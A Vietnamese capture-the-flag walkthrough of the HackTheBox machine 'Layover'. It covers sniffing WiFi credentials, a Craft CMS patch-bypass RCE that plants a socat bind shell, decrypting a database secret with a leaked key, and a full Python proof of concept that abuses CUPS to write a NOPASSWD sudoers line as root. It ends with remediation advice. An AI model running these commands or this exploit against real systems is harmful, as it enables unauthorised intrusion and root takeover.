@@ -1,0 +1,462 @@
+---
+title: 'Layover'
+description: 'Phiên bản tiếng Việt: WiFi mở lộ creds dạng cleartext, một CVE patch-bypass của Craft CMS cho blind RCE, security key bị lộ giải mã mật khẩu SMTP lưu trong DB để lấy shell user, và CUPS chạy dưới quyền root (CVE-2026-34990) ghi dòng NOPASSWD vào sudoers để lên root.'
+date: 2026-10-02
+platform: hackthebox
+room: 'Layover'
+roomUrl: 'https://app.hackthebox.com/machines/Layover'
+difficulty: medium
+tags:
+  - 'linux'
+  - 'rce'
+  - 'privesc'
+  - 'crypto'
+  - 'mysql'
+  - 'wifi-sniffing'
+  - 'craft-cms'
+  - 'cve'
+  - 'cups'
+  - 'patch-bypass'
+vulnClasses:
+  - 'cleartext wireless credentials'
+  - 'authenticated remote code execution'
+  - 'security patch bypass'
+  - 'reversible secret storage'
+  - 'insecure privileged service'
+translation: done
+draft: false
+retired: true # [[KIỂM TRA: phòng đã retired? schema bắt buộc true]]
+---
+
+## **HackTheBox: Layover — Creds qua WiFi, RCE patch-bypass trên Craft CMS, và Root qua CUPS**
+
+_Bài hướng dẫn giải "Layover", một box boot2root trên HackTheBox Season 12. Box mở đầu trên một mạng sân bay nơi WiFi nhân viên hoàn toàn không mã hóa, nên một lần đăng nhập bay qua dưới dạng cleartext. Bộ creds đó đưa ta vào Craft CMS với tư cách editor quyền thấp, nơi một patch-bypass của CVE-2026-28695 biến một lỗ "chỉ dành cho admin" thành authenticated blind RCE. Từ shell www-data, ta đọc security key của ứng dụng và một bí mật được mã hóa trong database, giải mã nó thành mật khẩu SSH của một user, và kết thúc bằng cách lạm dụng một CUPS daemon chạy dưới quyền root (CVE-2026-34990) sẵn sàng "in" một dòng NOPASSWD thẳng vào sudoers._
+
+> Flag, mật khẩu, key, và blob bí mật đã mã hóa đều được ẩn. Layover là máy huấn luyện hợp pháp trên HackTheBox; mọi thao tác thực hiện trên mục tiêu luyện tập được phép. Giá trị flag hiển thị dạng `<redacted>` và bí mật thu được dạng `<redacted>` — thật trên box nhưng được giữ kín ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Một **WiFi mở** (`key_mgmt=NONE`) làm lộ một lần đăng nhập qua không khí → `tshark` ở monitor mode bắt được **creds cleartext** của jenny gửi tới `portal.international.htb` → creds đó đăng nhập **Craft CMS** với tư cách Content Editor quyền thấp → một **patch bypass CVE-2026-28695** (Yii2 behavior injection chạm tới qua action quyền thấp `element-search`) cho **authenticated blind RCE**, giao qua một `socat` **bind shell** vì bộ lọc `escapeshellcmd()` chặn reverse shell → với tư cách `www-data` ta đọc `.env` (**security key** của Craft) và database (một blob `mailRelayPassword` đã mã hóa) → **giải mã blob bằng key bị lộ** để lấy mật khẩu SSH của aporter → **user flag** → một **CUPS** daemon chạy dưới quyền root trên `127.0.0.1:631` dính **CVE-2026-34990**: một rogue IPP server trộm được token `Local`, token đó cho phép tạo một printer `file://` để **in một dòng** **`NOPASSWD`** **vào** **`/etc/sudoers.d/`** → `sudo -i` → **root**.
+
+Mật khẩu bay trong không khí → RCE → key bị lộ → bí mật được giải mã → printer-to-root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>            # HTB machine entry point (ssh + rdp)
+export ATTACKER_IP=<jumpbox-ip>  # airside-ws01, our position on the internal net
+```
+
+Lượt quét bên ngoài cố tình trống trải — chỉ có dịch vụ truy cập từ xa được phơi ra:
+
+```text
+nmap -sS -p- -Pn -T4 --min-rate=1000 $IP
+# 22/tcp   open  ssh
+# 3389/tcp open  ms-wbt-server
+```
+
+RDP đưa ta tới một jumpbox, `airside-ws01`, nằm trong mạng nội bộ của sân bay:
+
+```text
+xfreerdp3 /v:$IP /u:contractor /p:'<redacted>' +clipboard /dynamic-resolution /drive:share,/tmp
+```
+
+Từ jumpbox, môi trường thực sự hiện ra: một phân đoạn nội bộ `10.13.37.0/24` chứa `portal.international.htb`, và một WiFi nhân viên (`HTB International WiFi`) mà jumpbox có thể nghe được qua một radio mô phỏng (`mac80211_hwsim`). WiFi mở đó chính là toàn bộ màn một.
+
+### **Lỗ hổng — bản vá chữ triệu chứng, không chữa nguyên nhân**
+
+Foothold là **CVE-2026-28695**, một authenticated RCE trong Craft CMS ≤ 5.9.8. Bản vá chính thức (commit `e31e508`) thu hẹp lời gọi `create()` dễ bị tổn thương chỉ còn cho các lớp con của `yii\base\BaseObject` và cho rằng chỉ admin mới chạm tới được. Cả hai giả định đều sai.
+
+<Callout type="insight">
+
+Nguyên nhân gốc là **Yii2 behavior injection**, không phải một tính năng admin. `yii\behaviors\AttributeTypecastBehavior` _là_ một `BaseObject`, nên nó sống sót qua bộ lọc và vẫn xâu chuỗi tới một sink `call_user_func()`. Tệ hơn, gadget này chạm tới được từ action quyền thấp **`element-search`** — một đường không-Twig cũng né luôn `CRAFT_ENABLE_TWIG_SANDBOX`. Bản vá khoá chặt cửa chính (admin) trong khi một cửa sổ bên hông (element search quyền editor) mở thẳng vào cùng căn phòng. **Vá một triệu chứng (ngữ cảnh admin) không phải là vá nguyên nhân (behavior injection).**
+
+</Callout>
+
+Một ràng buộc định hình mọi payload ở hạ nguồn: lệnh chạy qua `escapeshellcmd()` của PHP, hàm này vô hiệu hóa các ký tự đặc biệt của shell — không pipe, không redirect, không nối lệnh. Điều đó loại bỏ con đường reverse shell hiển nhiên và ép phải dùng cách "một binary + tham số" (`curl`, `socat`) cho mọi thứ tiếp theo.
+
+### **Bước 1 — Sniff creds cleartext từ WiFi mở**
+
+Jumpbox có hai radio: `wlan2` đã associate bình thường, `wlan3` rảnh để capture. Trước tiên tìm kênh của AP, rồi đưa `wlan3` vào monitor mode trên đúng kênh đó:
+
+```text
+iw dev wlan2 link
+#   SSID: HTB International WiFi
+#   freq: 2437.0          <- 2437 MHz = channel 6
+
+sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+sudo iw dev wlan3 set channel 6     # match the AP, or you hear nothing
+```
+
+Với radio đúng kênh, capture và lọc thân HTTP POST — form đăng nhập truyền trần trụi trên một mạng không mã hóa:
+
+```text
+sudo tshark -i wlan3 -Y "http.request.method == POST" -T fields \
+  -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri \
+  -e urlencoded-form.key -e urlencoded-form.value
+# 10.x.x.x -> 10.x.x.x  portal.international.htb  /miles/login.php  username,password  jenny,<redacted>
+```
+
+Một nhân viên đăng nhập vào portal đã trao cho ta **username và mật khẩu của jenny dưới dạng plaintext**, thẳng từ không khí.
+
+### **Bước 2 — Authenticated blind RCE trên Craft qua patch bypass**
+
+Creds của jenny xác thực được vào `/admin` của Craft, nhưng cô chỉ là **Content Editor** — PoC công khai của CVE-2026-28695 cần admin và sẽ bế tắc ở đây. PoC patch-bypass chạm tới gadget qua `element-search`, nên quyền editor là đủ. Trước tiên xác nhận thực thi bằng một timing oracle:
+
+```text
+# PoC: gbuyssens/CVE-2026-28695-craft-rce-bypass
+curl -s "https://raw.githubusercontent.com/gbuyssens/CVE-2026-28695-craft-rce-bypass/main/exploit.py" -o cve_exploit.py
+# edit the script with jenny's credentials, then:
+python3 cve_exploit.py http://portal.international.htb --check
+# [+] authenticated as jenny
+# [*] sleep 5 ...
+# [+] RCE CONFIRMED — +5.06s injected latency
+```
+
+Việc thực thi là **blind** (không trả output) và host Craft không route ngược được về jumpbox, nên reverse shell kiểu cũ thất bại gấp đôi. Câu trả lời sạch dưới `escapeshellcmd()` là một **bind shell** — server mở port và ta chủ động kết nối vào:
+
+```text
+python3 cve_exploit.py http://portal.international.htb --bind 4445
+# [*] planting bind shell: setsid socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/sh
+# [+] connect:  nc portal.international.htb 4445
+
+nc portal.international.htb 4445
+id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Nâng lên TTY ổn định:
+
+```text
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z; stty raw -echo; fg
+```
+
+### **Bước 3 — Vét config: arbitrary file read → .env + database**
+
+Với tư cách `www-data`, thư mục gốc của Craft (`/var/www/portal`) giữ chìa khóa cho phase tiếp theo. File `.env` làm lộ security key của ứng dụng _và_ credentials của database:
+
+```text
+cat /var/www/portal/.env
+# CRAFT_SECURITY_KEY=<redacted>
+# CRAFT_DB_USER=craftuser
+# CRAFT_DB_PASSWORD=<redacted>
+# CRAFT_DB_DATABASE=craft
+```
+
+Bộ creds DB đó mở được MariaDB cục bộ. Bảng `users` chỉ có bcrypt hash của `admin` và `jenny` — một cái bẫy hấp dẫn nhưng chậm. Phần thưởng thật sự là bảng settings tùy biến của app:
+
+```text
+mysql -u craftuser -p
+MariaDB [craft]> select name, value from htbairways_settings;
+# mailRelayPassword | <redacted-blob>   (base64 AES blob)
+# mailRelayHost     | mail.htbairways.htb
+# mailRelayUser     | aporter
+# mailRelayPort     | 587
+```
+
+### **Bước 4 — Giải mã bí mật mail-relay → user flag**
+
+Craft lưu mật khẩu SMTP relay ở dạng mã hóa-at-rest bằng `CRAFT_SECURITY_KEY`. Bình thường điều đó an toàn: ciphertext nằm trong database còn key nằm trong `.env`, hai chỗ mà attacker hiếm khi giữ được cùng lúc. Ở đây, arbitrary file read từ Phase 2 phá sập sự tách biệt đó — ta có **cả hai**.
+
+<Callout type="insight">
+
+**Mã hóa-at-rest chỉ bảo vệ bạn chừng nào key và ciphertext còn nằm tách nhau.** Arbitrary file read trao key (`.env`) còn truy cập DB trao blob; ghép lại là quay ngược thẳng về plaintext. Tái dùng mật khẩu SMTP thu được làm mật khẩu đăng nhập Linux là bàn thủng cuối cùng.
+
+</Callout>
+
+Chạy lại chính routine giải mã của Craft với key bị lộ để lấy plaintext:
+
+```text
+php -r '
+require "/var/www/portal/vendor/autoload.php";
+$key  = "<redacted>";
+$blob = "<redacted-blob>";
+$s = new yii\base\Security();
+echo $s->decryptByKey(base64_decode($blob), $key) . "\n";
+'
+# <redacted>   (aporter's SMTP relay password)
+```
+
+Mật khẩu đó được tái dùng cho tài khoản hệ thống `aporter`:
+
+```text
+su aporter        # password: <redacted>
+cat /home/aporter/user.txt
+# <redacted>
+```
+
+### **Bước 5 — Root qua CUPS IPP backdoor (CVE-2026-34990)**
+
+Với tư cách aporter, một CUPS scheduler chạy dưới quyền root đang lắng nghe trên loopback:
+
+```text
+ss -tlnp
+# 127.0.0.1:631  LISTEN   (cupsd, running as root)
+```
+
+<Callout type="note">
+
+**CVE-2026-34990** lạm dụng cách `cupsd` xác thực các yêu cầu IPP "local". Khi CUPS kiểm tra một printer với backend IPP, nó retry kèm header `Authorization: Local <token>`. Một **rogue IPP server** trên loopback trả `401` một lần để kích retry đó, rồi bắt lấy token. Có token, ta điều khiển các thao tác CUPS có đặc quyền — tạo một printer có `device-uri` là `file:///etc/sudoers.d/...`, lật nó ra khỏi trạng thái tạm thời để nó tồn tại, rồi **Print-Job** nội dung của ta: CUPS ghi "document" vào file đó **với quyền root**.
+
+</Callout>
+
+Dựng rogue IPP listener và kích CUPS kết nối tới nó để token `Local` bị lộ:
+
+```text
+# rogue IPP server on 127.0.0.1:9189 — returns 401 once, then captures the token
+python3 /tmp/rogue_ipp.py &
+
+# make cupsd reach out to the rogue backend
+ipptool -q -d "name=leak" -d "device=ipp://127.0.0.1:9189/ipp/print" \
+  ipp://localhost:631/ /usr/share/cups/ipptool/cups-create-local-printer.test
+# [+] TOKEN CAPTURED: <captured-token>
+```
+
+Với token, exploit script phát chuỗi IPP tới `/admin/`: `CUPS-Create-Local-Printer` với `device-uri=file:///etc/sudoers.d/aporter-cups`, `CUPS-Add-Modify-Printer` (`ppd-name=raw`, `printer-is-shared=true`, bỏ cờ tạm thời để nó được ghi vào `printers.conf`), `Accept-Jobs` + `Resume-Printer`, rồi một `Print-Job` nén gzip mà thân là dòng sudoers:
+
+```text
+# document written by the Print-Job, as root, into /etc/sudoers.d/aporter-cups
+aporter ALL=(ALL) NOPASSWD:ALL
+```
+
+Mọi IPP op trả `0x0000` (thành công); job trong hàng đợi được flush xuống đĩa khi `cupsd` quay vòng, và file drop-in sudoers xuất hiện. Từ đó chỉ là một lệnh để lên root:
+
+```text
+sudo -l
+# User aporter may run the following commands on portal:
+#     (ALL) NOPASSWD: ALL
+sudo -i
+cat /root/root.txt
+# <redacted>
+```
+
+Mật khẩu qua WiFi → Craft RCE → key bị lộ → bí mật được giải mã → CUPS printer-to-root. Mỗi bước tái dùng một thứ mà bước trước làm lộ.
+
+### POC
+
+```bash
+#!/usr/bin/env python3
+import socket, struct, gzip, threading, subprocess, time
+
+TOKEN = None
+DONE  = threading.Event()
+CPORT = 9189
+CUPS  = ("127.0.0.1", 631)
+
+IPP_OP_CUPS_ADD_MODIFY_PRINTER = 0x4003
+IPP_OP_CUPS_ACCEPT_JOBS        = 0x4008
+IPP_OP_RESUME_PRINTER          = 0x0011
+IPP_OP_CUPS_CREATE_LOCAL       = 0x4028
+IPP_OP_PRINT_JOB               = 0x0002
+
+def u16(n): return struct.pack(">H", n)
+def u32(n): return struct.pack(">I", n)
+def enc(tag, name, value):
+    if isinstance(value, str): value = value.encode()
+    n = name.encode()
+    return bytes([tag]) + u16(len(n)) + n + u16(len(value)) + value
+def enc_bool(name, v):
+    return bytes([0x22]) + u16(len(name)) + name.encode() + u16(1) + bytes([1 if v else 0])
+def ipp(op, rid, op_attrs, pr_attrs=None, doc=b""):
+    buf = struct.pack(">BBHI", 2, 0, op, rid) + bytes([0x01])
+    for a in op_attrs: buf += a
+    if pr_attrs:
+        buf += bytes([0x04])
+        for a in pr_attrs: buf += a
+    return buf + bytes([0x03]) + doc
+def common():
+    return [enc(0x47,"attributes-charset","utf-8"),
+            enc(0x48,"attributes-natural-language","en"),
+            enc(0x42,"requesting-user-name","aporter")]
+def post(path, body, token=None, timeout=3):
+    hdrs = [f"POST {path} HTTP/1.1",
+            "Host: 127.0.0.1:631",
+            "Content-Type: application/ipp",
+            f"Content-Length: {len(body)}",
+            "Connection: close"]
+    if token: hdrs.append(f"Authorization: Local {token}")
+    s = socket.create_connection(CUPS, timeout=timeout)
+    s.sendall(("\r\n".join(hdrs)+"\r\n\r\n").encode()+body)
+    resp = b""
+    s.settimeout(timeout)
+    try:
+        while True:
+            d = s.recv(4096)
+            if not d: break
+            resp += d
+    except: pass
+    s.close()
+    ipp_r = resp.split(b"\r\n\r\n",1)[1] if b"\r\n\r\n" in resp else resp
+    http = int(resp.split(b" ")[1]) if b" " in resp[:20] else 0
+    st = struct.unpack(">H", ipp_r[2:4])[0] if len(ipp_r)>=4 else -1
+    return http, st
+
+def read_req(conn):
+    data = bytearray()
+    conn.settimeout(5)
+    while b"\r\n\r\n" not in data:
+        c = conn.recv(4096)
+        if not c: break
+        data.extend(c)
+    return bytes(data)
+
+def rogue():
+    global TOKEN
+    srv = socket.socket()
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("127.0.0.1", CPORT)); srv.listen(5); srv.settimeout(0.5)
+    deadline = time.time() + 15
+    while time.time() < deadline and not TOKEN:
+        try: conn, _ = srv.accept()
+        except socket.timeout: continue
+        with conn:
+            data = read_req(conn).decode("latin1","replace")
+            tok = None
+            for line in data.splitlines():
+                if line.lower().startswith("authorization: local "):
+                    tok = line.split(None,2)[2].strip()
+            if tok:
+                TOKEN = tok; DONE.set()
+                print(f"[+] Token: {tok}")
+                ipp_ok = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
+                          b"\x47\x00\x12attributes-charset\x00\x05utf-8"
+                          b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
+                reply = (b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\n" +
+                         f"Content-Length: {len(ipp_ok)}\r\nConnection: close\r\n\r\n".encode() + ipp_ok)
+                conn.sendall(reply)
+            else:
+                print(".", end="", flush=True)
+                conn.sendall(b"HTTP/1.1 401 Unauthorized\r\n"
+                             b"WWW-Authenticate: Local trc=\"y\"\r\n"
+                             b"Content-Length: 0\r\nConnection: close\r\n\r\n")
+    srv.close()
+
+threading.Thread(target=rogue, daemon=True).start()
+time.sleep(0.3)
+proc = subprocess.Popen(["ipptool","-q",
+    "-d","name=admintest",
+    "-d",f"device=ipp://127.0.0.1:{CPORT}/ipp/print",
+    "ipp://localhost:631/",
+    "/usr/share/cups/ipptool/cups-create-local-printer.test"])
+DONE.wait(timeout=10)
+if not TOKEN: print("[-] No token"); exit(1)
+
+PNAME = "pwntestprinter"
+
+# Test Add-Modify-Printer WITH token
+print("\n[*] Test CUPS-Add-Modify-Printer WITH token...")
+body = ipp(IPP_OP_CUPS_ADD_MODIFY_PRINTER, 1,
+           common()+[enc(0x45,"printer-uri",f"ipp://localhost:631/printers/{PNAME}")],
+           [enc(0x42,"ppd-name","raw"), enc_bool("printer-is-shared",True)])
+h,s = post("/admin/", body, TOKEN)
+print(f"  HTTP={h} IPP=0x{s:04x} ← {'OK' if s==0 else 'FAIL'}")
+
+# Test WITHOUT token
+print("[*] Test CUPS-Add-Modify-Printer WITHOUT token...")
+h,s = post("/admin/", body)
+print(f"  HTTP={h} IPP=0x{s:04x} ← {'OK' if s==0 else 'NEEDS AUTH'}")
+
+# Now: Create printer with file://, immediately do Add-Modify (ppd-name=raw, printer-is-shared=true)
+print("\n[*] RACE TEST: Create file:// printer → immediately Add-Modify...")
+import os
+
+TARGET = "/etc/sudoers.d/aporter-cups"
+CONTENT = b"aporter ALL=(ALL) NOPASSWD:ALL\n"
+
+# Create printer (keep socket open)
+create_body = ipp(IPP_OP_CUPS_CREATE_LOCAL, 2,
+                  common()+[enc(0x45,"printer-uri","ipp://localhost:631/")],
+                  [enc(0x42,"printer-name",PNAME),
+                   enc(0x45,"device-uri",f"file://{TARGET}")])
+hdrs_str = (f"POST / HTTP/1.1\r\nHost: 127.0.0.1:631\r\n"
+            f"Content-Type: application/ipp\r\nContent-Length: {len(create_body)}\r\n"
+            f"Connection: close\r\n\r\n")
+sock = socket.create_connection(CUPS, timeout=3)
+sock.sendall(hdrs_str.encode() + create_body)
+
+# IMMEDIATELY fire admin ops (no sleep)
+for i in range(80):
+    rid = 100 + i*4
+    # Add-Modify: ppd-name=raw, printer-is-shared=True (NO device-uri!)
+    b1 = ipp(IPP_OP_CUPS_ADD_MODIFY_PRINTER, rid,
+             common()+[enc(0x45,"printer-uri",f"ipp://localhost:631/printers/{PNAME}")],
+             [enc(0x42,"ppd-name","raw"), enc_bool("printer-is-shared",True)])
+    h1,s1 = post("/admin/", b1, TOKEN)
+
+    b2 = ipp(IPP_OP_CUPS_ACCEPT_JOBS, rid+1,
+             common()+[enc(0x45,"printer-uri",f"ipp://localhost:631/printers/{PNAME}")])
+    h2,s2 = post("/admin/", b2, TOKEN)
+
+    b3 = ipp(IPP_OP_RESUME_PRINTER, rid+2,
+             common()+[enc(0x45,"printer-uri",f"ipp://localhost:631/printers/{PNAME}")])
+    h3,s3 = post("/admin/", b3, TOKEN)
+
+    # Print-Job (no auth)
+    job = ipp(IPP_OP_PRINT_JOB, rid+3,
+              common()+[enc(0x45,"printer-uri",f"ipp://localhost:631/printers/{PNAME}"),
+                        enc(0x49,"document-format","application/vnd.cups-raw"),
+                        enc(0x44,"compression","gzip"),
+                        enc(0x42,"job-name","pwn")],
+              doc=gzip.compress(CONTENT))
+    h4,s4 = post(f"/printers/{PNAME}", job)
+
+    if i == 0:
+        print(f"  i=0: mod={s1:04x} acc={s2:04x} res={s3:04x} job={s4:04x}")
+    time.sleep(0.01)
+    if os.path.exists(TARGET) and os.path.getsize(TARGET)>0:
+        print(f"\n[+] SUCCESS at i={i}!")
+        break
+
+sock.close()
+if os.path.exists(TARGET) and os.path.getsize(TARGET)>0:
+    print(f"[+] {TARGET}\n    {open(TARGET).read()}")
+    print("[+] sudo -n bash")
+else:
+    print(f"\n[-] Not written. Last: mod={s1:04x} acc={s2:04x} res={s3:04x} job={s4:04x}")
+    import subprocess
+    subprocess.run(["tail","-5","/var/log/cups/error_log"])
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — xâm phạm từ xa hoàn toàn lên root.** Một điểm đại diện cho RCE foothold là **CVSS 3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`): remote code execution có xác thực nhưng quyền thấp, xâu chuỗi toàn bộ lên root. Chuỗi này xếp chồng bốn thất bại riêng biệt, đều có thể tái hiện:
+
+- **Không mã hóa wireless** — một lần đăng nhập của nhân viên đọc được bởi bất kỳ ai trong tầm phủ sóng; credentials bay qua không khí dưới dạng plaintext.
+- **Một bản vá bảo mật không đầy đủ** — bản vá của CVE-2026-28695 canh ngữ cảnh admin, không phải Yii2 behavior injection bên dưới, để lại một đường tới RCE ở mức editor.
+- **Lưu bí mật có thể đảo ngược** — một khi arbitrary file read làm lộ security key, mọi giá trị "đã mã hóa" trong database (ở đây là mật khẩu SMTP tái dùng cho SSH) giải mã dễ dàng.
+- **Một dịch vụ cục bộ chạy dưới quyền root ghi được file do attacker kiểm soát** — CUPS (CVE-2026-34990) biến một token local bắt được thành arbitrary root file write, tức leo quyền tức thì.
+
+</Callout>
+
+### **Khắc phục đề xuất**
+
+<Callout type="fix">
+
+1. **Mã hóa mạng wireless.** Tối thiểu WPA2/WPA3-Enterprise; đừng bao giờ chạy đăng nhập portal nhân viên trên một SSID mở, và phục vụ portal qua HTTPS để credentials không thể thu lại từ không khí.
+2. **Vá nguyên nhân, không phải ngữ cảnh.** Nâng cấp Craft CMS qua khỏi patch-bypass CVE-2026-28695 và giới hạn việc khởi tạo object bằng một allow-list các lớp an toàn, không phải bằng quyền của người gọi. Giữ Twig sandbox có ý nghĩa trên _mọi_ đường code.
+3. **Bảo vệ bí mật at-rest cho đúng.** Lưu application key bên ngoài web root với quyền file tối thiểu, đừng chạy web app dưới một user có thể đọc nó, và đừng bao giờ tái dùng một bí mật dịch vụ (SMTP) làm mật khẩu đăng nhập.
+4. **Siết chặt CUPS.** Vá CVE-2026-34990, tắt `cups-browsed`/các IPP backend không cần thiết, chỉ bind đúng socket bạn cần, và coi bất kỳ root daemon nào có thể ghi file tùy ý là một ranh giới đặc quyền cần làm cứng.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **WiFi mở là một vòi rồng credentials.** Monitor mode đúng kênh cộng một bộ lọc POST là đủ để kéo một lần đăng nhập plaintext ra khỏi không khí — mã hóa và HTTPS không phải là tùy chọn.
+- **Một bản vá nhắm vào triệu chứng để lỗ hổng vẫn sống.** CVE-2026-28695 được "vá" cho admin, nhưng lỗ thật (Yii2 behavior injection) vẫn chạm tới được từ một action quyền thấp hơn.
+- **Bộ lọc phòng thủ định hình lại exploit, chứ không chặn được nó.** `escapeshellcmd()` chặn reverse shell, nên đòn tấn công pivot sang bind shell và exfil bằng một binary duy nhất — cùng RCE, khác cách giao.
+- **Mã hóa-at-rest thất bại ngay khi một lỗ trao cả key lẫn ciphertext.** File read cộng truy cập DB biến một bí mật đã lưu quay lại thành mật khẩu plaintext.
+- **Enumerate các dịch vụ cục bộ chạy dưới quyền root.** Nấc cuối không phải một lỗ kernel — mà là một CUPS daemon root bị lừa in một dòng sudoers.
+
+Cảm ơn bạn đã đọc. Layover là một ví dụ gọn gàng về một chuỗi mà không lỗ nào đơn lẻ là kỳ lạ — WiFi mở, một bản vá không đầy đủ, một bí mật giải mã được, một dịch vụ in lắm lời — nhưng mỗi cái trao cho cái tiếp theo đúng thứ nó cần để leo từ bãi đỗ xe lên root.
